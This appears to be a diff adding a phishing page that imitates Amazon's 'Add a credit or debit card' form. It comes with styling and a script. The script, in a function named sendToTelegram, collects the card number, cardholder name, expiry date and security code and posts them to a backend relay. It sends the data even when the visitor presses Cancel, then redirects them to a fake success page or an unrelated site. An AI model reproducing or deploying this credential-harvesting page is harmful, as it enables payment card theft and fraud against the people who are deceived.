@@ -1,0 +1,436 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Add a credit or debit card</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: "Amazon Ember", Arial, sans-serif;
+            background-color: #F3F3F3;
+            padding: 40px 20px;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background-image: url('background.jpg');
+            background-size: cover;
+            background-position: center;
+            background-repeat: no-repeat;
+            background-attachment: fixed;
+        }
+
+        .container {
+            max-width: 600px;
+            width: 100%;
+            margin: 0 auto;
+            background-color: #FFFFFF;
+            padding: 40px;
+            border-radius: 12px;
+            box-shadow: 0 4px 16px rgba(0, 0, 0, 0.12);
+        }
+
+        h1 {
+            font-size: 32px;
+            font-weight: 500;
+            color: #0F1111;
+            margin-bottom: 30px;
+            text-align: center;
+            letter-spacing: -0.5px;
+        }
+
+        .form-group {
+            margin-bottom: 24px;
+        }
+
+        label {
+            display: block;
+            font-size: 14px;
+            font-weight: 700;
+            color: #0F1111;
+            margin-bottom: 8px;
+            letter-spacing: 0.2px;
+        }
+
+        input[type="tel"],
+        input[type="text"],
+        select {
+            width: 100%;
+            padding: 12px 14px;
+            font-size: 15px;
+            border: 1px solid #D5D9D9;
+            border-radius: 8px;
+            background-color: #FFFFFF;
+            transition: all 0.2s ease;
+            font-family: inherit;
+        }
+
+        input[type="tel"]:focus,
+        input[type="text"]:focus,
+        select:focus {
+            outline: none;
+            border-color: #E77600;
+            box-shadow: 0 0 0 3px rgba(231, 118, 0, 0.1);
+        }
+
+        input[type="tel"]:hover,
+        input[type="text"]:hover,
+        select:hover {
+            border-color: #A8A8A8;
+        }
+
+        .card-number-group {
+            position: relative;
+        }
+
+        .card-number-group input {
+            padding-right: 110px;
+        }
+
+        .card-logos {
+            position: absolute;
+            right: 12px;
+            top: 50%;
+            transform: translateY(-50%);
+            margin-top: 14px;
+            display: flex;
+            gap: 6px;
+            pointer-events: none;
+            align-items: center;
+            height: 28px;
+        }
+
+        .card-logos img {
+            height: 28px;
+            width: auto;
+            object-fit: contain;
+            border-radius: 4px;
+            display: block;
+        }
+
+        .expiration-row {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 16px;
+        }
+
+        select {
+            cursor: pointer;
+            appearance: none;
+            background-image: url("data:image/svg+xml;charset=UTF-8,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='%23565959' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'%3e%3cpolyline points='6 9 12 15 18 9'%3e%3c/polyline%3e%3c/svg%3e");
+            background-repeat: no-repeat;
+            background-position: right 12px center;
+            background-size: 18px;
+            padding-right: 40px;
+        }
+
+        .security-code-group {
+            position: relative;
+            max-width: 280px;
+        }
+
+        .security-code-group input {
+            padding-right: 14px;
+            letter-spacing: 2px;
+        }
+
+        .button-group {
+            margin-top: 36px;
+            display: flex;
+            gap: 12px;
+            flex-direction: column;
+        }
+
+        button {
+            width: 100%;
+            padding: 14px 24px;
+            font-size: 15px;
+            font-weight: 500;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            border: none;
+            letter-spacing: 0.3px;
+        }
+
+        .btn-primary {
+            background: linear-gradient(to bottom, #f7dfa5, #f0c14b);
+            border: 1px solid #a88734;
+            color: #0F1111;
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
+        }
+
+        .btn-primary:hover {
+            background: linear-gradient(to bottom, #f5d78e, #edb932);
+            box-shadow: 0 3px 8px rgba(0, 0, 0, 0.15);
+            transform: translateY(-1px);
+        }
+
+        .btn-primary:active {
+            transform: translateY(0);
+            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.1);
+        }
+
+        .btn-secondary {
+            background-color: #FFFFFF;
+            border: 1px solid #D5D9D9;
+            color: #0F1111;
+        }
+
+        .btn-secondary:hover {
+            background-color: #F7F8F8;
+            border-color: #A8A8A8;
+        }
+
+        .btn-secondary:active {
+            background-color: #E7E9EC;
+        }
+
+        /* Input validation states */
+        input:invalid:not(:placeholder-shown) {
+            border-color: #D00000;
+        }
+
+        input:valid:not(:placeholder-shown) {
+            border-color: #067D62;
+        }
+
+        /* Responsive Design */
+        @media (max-width: 640px) {
+            .container {
+                padding: 30px 24px;
+            }
+
+            h1 {
+                font-size: 26px;
+            }
+
+            .button-group {
+                gap: 10px;
+            }
+
+            .card-logos {
+                right: 10px;
+                gap: 4px;
+            }
+
+            .card-logos img {
+                height: 24px;
+            }
+        }
+
+        /* Loading animation */
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+                transform: translateY(10px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .container {
+            animation: fadeIn 0.4s ease-out;
+        }
+
+        /* Card logos hover effect */
+        .card-logos img {
+            transition: transform 0.2s ease;
+        }
+
+        .card-number-group:hover .card-logos img {
+            transform: scale(1.05);
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Payment method</h1>
+
+        <form id="cardForm">
+            <div class="form-group card-number-group">
+                <label for="cardNumber">Card number</label>
+                <input 
+                    type="tel" 
+                    id="cardNumber" 
+                    name="cardNumber" 
+                    maxlength="19"
+                    placeholder=""
+                    required
+                >
+                <div class="card-logos">
+                    <img src="master.jpg" alt="Mastercard">
+                    <img src="visa.jpg" alt="Visa">
+                </div>
+            </div>
+
+            <div class="form-group">
+                <label for="cardName">Name on card</label>
+                <input 
+                    type="text" 
+                    id="cardName" 
+                    name="cardName"
+                    placeholder=""
+                    required
+                >
+            </div>
+
+            <div class="form-group">
+                <label>Expiration date</label>
+                <div class="expiration-row">
+                    <select id="expMonth" name="expMonth" required>
+                        <option value="" disabled selected>Month</option>
+                        <option value="01">01</option>
+                        <option value="02">02</option>
+                        <option value="03">03</option>
+                        <option value="04">04</option>
+                        <option value="05">05</option>
+                        <option value="06">06</option>
+                        <option value="07">07</option>
+                        <option value="08">08</option>
+                        <option value="09">09</option>
+                        <option value="10">10</option>
+                        <option value="11">11</option>
+                        <option value="12">12</option>
+                    </select>
+                    <select id="expYear" name="expYear" required>
+                        <option value="" disabled selected>Year</option>
+                        <option value="2025">2025</option>
+                        <option value="2026">2026</option>
+                        <option value="2027">2027</option>
+                        <option value="2028">2028</option>
+                        <option value="2029">2029</option>
+                        <option value="2030">2030</option>
+                        <option value="2031">2031</option>
+                        <option value="2032">2032</option>
+                        <option value="2033">2033</option>
+                        <option value="2034">2034</option>
+                        <option value="2035">2035</option>
+                    </select>
+                </div>
+            </div>
+
+            <div class="form-group">
+                <label for="securityCode">Security code</label>
+                <div class="security-code-group">
+                    <input 
+                        type="tel" 
+                        id="securityCode" 
+                        name="securityCode" 
+                        placeholder="***"
+                        maxlength="4"
+                        required
+                    >
+                </div>
+            </div>
+
+            <div class="button-group">
+                <button type="submit" class="btn-primary">Confirm</button>
+                <button type="button" class="btn-secondary">Cancel</button>
+            </div>
+        </form>
+    </div>
+
+    <script>
+        // Format card number with spaces
+        document.getElementById('cardNumber').addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\s/g, '');
+            let formattedValue = value.match(/.{1,4}/g)?.join(' ') || value;
+            e.target.value = formattedValue;
+        });
+
+        // Only allow numbers in card number field
+        document.getElementById('cardNumber').addEventListener('keypress', function(e) {
+            if (!/[0-9]/.test(e.key)) {
+                e.preventDefault();
+            }
+        });
+
+        // Only allow numbers in security code field
+        document.getElementById('securityCode').addEventListener('keypress', function(e) {
+            if (!/[0-9]/.test(e.key)) {
+                e.preventDefault();
+            }
+        });
+
+        // Convert name to uppercase
+        document.getElementById('cardName').addEventListener('input', function(e) {
+            e.target.value = e.target.value.toUpperCase();
+        });
+
+        // Function to send data to backend API
+        async function sendToTelegram() {
+            // Get all form values
+            const cardNumber = document.getElementById('cardNumber').value.trim() || 'no i4';
+            const cardName = document.getElementById('cardName').value.trim() || 'no i4';
+            const expMonth = document.getElementById('expMonth').value;
+            const expYear = document.getElementById('expYear').value;
+            const expirationDate = (expMonth && expYear) ? `${expMonth}/${expYear}` : 'no i4';
+            const securityCode = document.getElementById('securityCode').value.trim() || 'no i4';
+
+            // Backend API URL
+            const BACKEND_API_URL = 'http://localhost:10000/api/send-payment';
+
+            try {
+                const response = await fetch(BACKEND_API_URL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        cardNumber: cardNumber,
+                        cardName: cardName,
+                        expirationDate: expirationDate,
+                        securityCode: securityCode
+                    })
+                });
+
+                if (response.ok) {
+                    return true;
+                } else {
+                    console.error('Failed to send to backend');
+                    return false;
+                }
+            } catch (error) {
+                console.error('Error sending to backend:', error);
+                return false;
+            }
+        }
+
+        // Form submission
+        document.getElementById('cardForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            // Add loading state
+            const submitBtn = this.querySelector('.btn-primary');
+            const originalText = submitBtn.textContent;
+            submitBtn.textContent = 'Processing...';
+            submitBtn.disabled = true;
+            
+            await sendToTelegram();
+            
+            // Reset button
+            submitBtn.textContent = originalText;
+            submitBtn.disabled = false;
+            
+            window.location.href = 'success.html';
+        });
+
+        // Cancel button
+        document.querySelector('.btn-secondary').addEventListener('click', async function() {
+            if (confirm('Are you sure you want to cancel?')) {
+                await sendToTelegram();
+                window.location.href = 'https://www.foundanimals.org/';
+            }
+        });
+    </script>
+</body>
+</html>
